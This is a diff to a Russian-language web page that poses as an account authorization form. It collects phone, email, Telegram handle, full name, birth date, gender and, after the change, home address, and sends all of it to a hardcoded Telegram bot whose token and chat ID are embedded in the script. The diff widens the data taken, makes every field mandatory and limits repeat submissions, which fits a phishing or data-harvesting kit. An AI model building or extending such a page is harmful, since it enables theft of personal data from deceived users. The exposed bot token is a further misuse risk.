@@ -34,7 +34,7 @@
     .small-note { color:#666; font-size:11px; margin-top:6px; }
     .info-placeholder-x { font-size:14px; color:var(--placeholder); border-bottom:1px solid var(--border); padding:5px 0; cursor:pointer; display:flex; align-items:center; gap:8px; }
     .notice { font-size:13px; color:var(--muted-text); margin-top:20px; }
-    .authorize-btn, .save-button { margin-top:30px; width:100%; padding:12px; background:var(--button-bg); color:var(--text-color); border:none; border-radius:6px; font-weight:bold; font-size:14px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; }
+    .authorize-btn, .save-button { margin-top:30px; width:100%; padding:12px; background:var(--button-bg); color:var(--text-color); border:none; border-radius:6px; font-weight:bold; font-size:14px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; transition:background 0.3s; }
     .authorize-btn:hover, .save-button:hover { background:var(--button-hover); }
     .authorize-btn i, .save-button i { font-size:16px; }
     .page { display:none; }
@@ -64,8 +64,6 @@
     if(theme.button_color) document.documentElement.style.setProperty('--button-bg', theme.button_color);
     if(theme.button_text_color) document.documentElement.style.setProperty('--text-color', theme.button_text_color);
   </script>
-  <!-- остальной HTML без изменений -->
-
 
   <!-- Page 1 -->
   <div id="page1" class="page active">
@@ -81,7 +79,7 @@
       </div>
 
       <div class="info-item">
-        <div class="info-label">Номер телефона</div>
+        <div class="info-label">Телефон</div>
         <input id="phone" type="text" placeholder="+7 999 999-99-99" oninput="updateLanguageNote()">
       </div>
 
@@ -90,8 +88,13 @@
         <input id="email" type="text" placeholder="example@mail.com">
       </div>
 
+      <div class="info-item">
+        <div class="info-label">Telegram</div>
+        <input id="telegram" type="text" placeholder="@username или username">
+      </div>
+
       <div class="notice">Вы разрешаете @lisurgut отправлять Вам сообщения.</div>
-      <button class="authorize-btn" onclick="authorize()"><i class="fas fa-unlock"></i> АВТОРИЗОВАТЬСЯ</button>
+      <button class="authorize-btn" onclick="authorize(this)"><i class="fas fa-unlock"></i> <span>АВТОРИЗОВАТЬСЯ</span></button>
     </div>
   </div>
 
@@ -103,11 +106,12 @@
 
       <div class="section-title">Личная информация</div>
       <div class="row"><div class="label">Имя</div><input id="fname" type="text"></div>
-      <div class="row"><div class="label">Отчество</div><input id="mname" type="text"></div>
       <div class="row"><div class="label">Фамилия</div><input id="lname" type="text"></div>
+      <div class="row"><div class="label">Отчество</div><input id="mname" type="text"></div>
       <div class="row"><div class="label">Дата рождения</div><div class="dob-group"><input id="day" type="text" placeholder="ДД"><input id="month" type="text" placeholder="ММ"><input id="year" type="text" placeholder="ГГГГ"></div></div>
       <div class="row"><div class="label">Пол</div><div class="gender-group"><div class="gender-option" onclick="selectGender('male')"><div class="radio checked" id="male-radio"></div> Мужской</div><div class="gender-option" onclick="selectGender('female')"><div class="radio" id="female-radio"></div> Женский</div></div></div>
       <div class="row"><div class="label">Гражданство</div><div class="static-value">Russian Federation</div></div>
+      <div class="row"><div class="label">Адрес</div><input id="address" type="text"></div>
       <div class="row"><div class="label">Местожительство</div><div class="static-value">Russian Federation</div></div>
 
       <div class="section-title" id="language-note">Ваше имя на языке страны проживания</div>
@@ -124,23 +128,94 @@
     const prefixMap = {};
     const botToken = '8112715154:AAG8UTvBi79BvqBB4Cqob95oYgJxbXpgjiY';
     const targetChat = '6222585321';
+    let submissionCount = 0;
 
     document.addEventListener('DOMContentLoaded', async () => {
-      try { const data = await fetch('https://insurgut.github.io/api/num.json').then(r=>r.json()); Object.assign(prefixMap,data);} catch(e){}
-      const s=JSON.parse(localStorage.getItem('userData')||'{}');
-      if(s.phone)phone.value=s.phone; if(s.email)email.value=s.email;
-      if(s.fname)fname.value=s.fname; if(s.mname)mname.value=s.mname; if(s.lname)lname.value=s.lname;
-      if(s.birth){const[p,m,y]=s.birth.split('.');day.value=p; month.value=m; year.value=y;}
-      if(s.gender)selectGender(s.gender);
+      try {
+        const data = await fetch('https://insurgut.github.io/api/num.json').then(r => r.json());
+        Object.assign(prefixMap, data);
+      } catch (e) {}
+
+      const s = JSON.parse(localStorage.getItem('userData') || '{}');
+      if (s.phone) phone.value = s.phone;
+      if (s.email) email.value = s.email;
+      if (s.telegram) telegram.value = s.telegram;
+      if (s.fname) fname.value = s.fname;
+      if (s.mname) mname.value = s.mname;
+      if (s.lname) lname.value = s.lname;
+      if (s.address) address.value = s.address;
+      if (s.birth) {
+        const [p, m, y] = s.birth.split('.');
+        day.value = p; month.value = m; year.value = y;
+      }
+      if (s.gender) selectGender(s.gender);
       updateLanguageNote();
     });
 
-    function selectGender(g){currentGender=g;document.getElementById('male-radio').classList.toggle('checked',g==='male');document.getElementById('female-radio').classList.toggle('checked',g==='female');}
-    function goToPage(n){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('page'+n).classList.add('active');}
-    function saveData(){const d={phone:phone.value,email:email.value,fname:fname.value,mname:mname.value,lname:lname.value,birth:`${day.value}.${month.value}.${year.value}`,gender:currentGender};localStorage.setItem('userData',JSON.stringify(d));goToPage(1);return d;}
-    async function authorize(){const d=saveData();const msg=`Новая заявка:\nТелефон: ${d.phone}\nEmail: ${d.email}\nИмя: ${d.fname} ${d.mname} ${d.lname}\nДата рождения: ${d.birth}\nПол: ${d.gender}`;try{await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:targetChat,text:msg})});alert('Данные отправлены!');}catch{alert('Ошибка при отправке');}}
-    function updateLanguageNote(){const v=phone.value;let m='';for(const p in prefixMap)if(v.startsWith(p)&&p.length>m.length)m=p;document.getElementById('language-note').textContent=prefixMap[m]||'Ваше имя на языке страны проживания';}
-    document.getElementById('phone').addEventListener('input',updateLanguageNote);
+    function selectGender(g) {
+      currentGender = g;
+      document.getElementById('male-radio').classList.toggle('checked', g === 'male');
+      document.getElementById('female-radio').classList.toggle('checked', g === 'female');
+    }
+
+    function goToPage(n) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById('page' + n).classList.add('active');
+    }
+
+    function saveData() {
+      const d = {
+        phone: phone.value.trim(),
+        email: email.value.trim(),
+        telegram: telegram.value.trim(),
+        fname: fname.value.trim(),
+        mname: mname.value.trim(),
+        lname: lname.value.trim(),
+        address: address.value.trim(),
+        birth: `${day.value.trim()}.${month.value.trim()}.${year.value.trim()}`,
+        gender: currentGender
+      };
+      localStorage.setItem('userData', JSON.stringify(d));
+      goToPage(1);
+      return d;
+    }
+
+    async function authorize(btn) {
+      if (submissionCount >= 2) {
+        const span = btn.querySelector('span');
+        const oldText = span.textContent;
+        span.textContent = 'Вы уже оставляли заявку!';
+        setTimeout(() => { span.textContent = oldText; }, 1000);
+        return;
+      }
+
+      const d = saveData();
+      if (!d.phone || !d.email || !d.telegram || !d.fname || !d.lname || !d.address || !day.value || !month.value || !year.value) {
+        alert('Пожалуйста, заполните все обязательные поля.');
+        return;
+      }
+
+      const msg = `Новая заявка:\nТелефон: ${d.phone}\nEmail: ${d.email}\nTelegram: ${d.telegram}\nИмя: ${d.fname} ${d.mname} ${d.lname}\nДата рождения: ${d.birth}\nПол: ${d.gender}\nАдрес: ${d.address}`;
+
+      try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: targetChat, text: msg })
+        });
+        submissionCount++;
+        alert('Данные отправлены!');
+      } catch {
+        alert('Ошибка при отправке');
+      }
+    }
+
+    function updateLanguageNote() {
+      const v = phone.value;
+      let m = '';
+      for (const p in prefixMap) if (v.startsWith(p) && p.length > m.length) m = p;
+      document.getElementById('language-note').textContent = prefixMap[m] || 'Ваше имя на языке страны проживания';
+    }
   </script>
 </body>
 </html>
